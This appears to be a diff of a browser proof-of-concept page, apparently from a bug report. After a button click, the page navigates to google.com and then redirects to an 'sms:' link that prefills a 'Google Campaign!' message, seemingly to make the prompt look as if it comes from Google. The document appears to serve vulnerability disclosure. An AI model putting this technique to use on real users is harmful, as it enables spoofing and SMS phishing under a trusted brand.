@@ -1,9 +1,21 @@
-<script>
-function exploit(){
-  var win = window.open('https://google.com/','');
-  setTimeout(function(){
-  location.href = "sms:1337&body=Google Campaign!";
-  }, 2000);
-}
-</script>
-<button onclick="exploit()">Click</button>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>POC</title>
+</head>
+<body>
+    <h1>Same tab test</h1>
+    <button onclick="exploit()">Click</button>
+    <script>
+        function exploit() {
+            location.href = "https://google.com/";
+
+            setTimeout(function() {
+                location.href = "sms:1337&body=Google Campaign!";
+            }, 2000);
+        }
+    </script>
+</body>
+</html>
